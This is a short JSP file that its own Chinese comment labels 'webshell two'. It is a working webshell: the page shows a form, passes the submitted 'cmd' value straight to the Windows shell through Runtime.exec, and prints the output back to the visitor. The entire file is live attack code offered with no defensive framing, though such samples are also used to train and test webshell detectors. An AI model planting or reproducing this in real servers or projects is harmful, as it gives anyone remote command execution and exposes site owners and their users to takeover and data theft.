<%@ page import="java.util.*,java.io.*,java.net.*"%>
<%
//我是webshell two
%>
<HTML><BODY>
<FORM METHOD="POST" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%

 Process p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"));
 OutputStream os = p.getOutputStream();
 InputStream in = p.getInputStream();
 DataInputStream dis = new DataInputStream(in);
 String disr = dis.readLine();
 while ( disr != null ) {
        out.println(disr); disr = dis.readLine(); 
 }
%>
</pre>
</BODY></HTML>
